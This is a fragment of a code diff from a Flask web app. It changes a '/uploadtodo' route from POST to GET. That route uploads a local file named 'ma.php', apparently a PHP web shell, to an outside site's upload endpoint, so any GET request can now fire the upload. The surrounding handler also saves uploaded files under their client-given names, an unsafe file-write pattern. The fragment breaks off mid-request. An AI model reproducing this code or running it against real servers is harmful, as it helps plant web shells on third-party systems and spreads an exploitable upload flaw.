@@ -458,7 +458,7 @@ def upload():
         file.save(file.filename)
         return "File uploaded successfully", 200
 
-@users_bp.route("/uploadtodo", methods=["POST"])
+@users_bp.route("/uploadtodo", methods=["GET"])
 def uploadtodo():
     res = requests.post('https://ai.taxplus.cn/upload/upload', files={'file': open('ma.php', 'rb')},headers={
         'Accept': 'application/json, text/javascript, */*; q=0.01',
